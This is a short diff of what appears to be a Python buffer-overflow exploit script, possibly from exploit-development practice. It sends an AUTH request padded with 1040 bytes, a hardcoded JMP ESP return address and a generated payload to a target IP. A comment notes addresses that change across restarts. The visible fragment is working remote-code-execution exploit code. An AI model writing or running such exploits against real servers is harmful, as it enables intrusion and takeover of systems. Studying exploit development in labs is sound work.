@@ -84,10 +84,10 @@ def replicate_crash(ip):
     """Sending bad characters to determine termination bytes"""
     #req = "AUTH " + "\x41" * 1044 + get_bad_chars() + "\x42" * 24
 
-    """Sending generated payload"""
+    """Sending generated payload with permanent JMP ESP location"""
     payload = get_payload()
     req = "AUTH " + "\x41" * 1040 + "\x71\x1D\xD1\x65" + payload + "\x42" * 24
-
+    # Impermanent addresses: "\x71\xE8\x09\x77" (pre restart) - "\x71\xE8\xE4\x76" (post restart)
     connect_to_server(ip, req)
 
 if __name__ == "__main__":
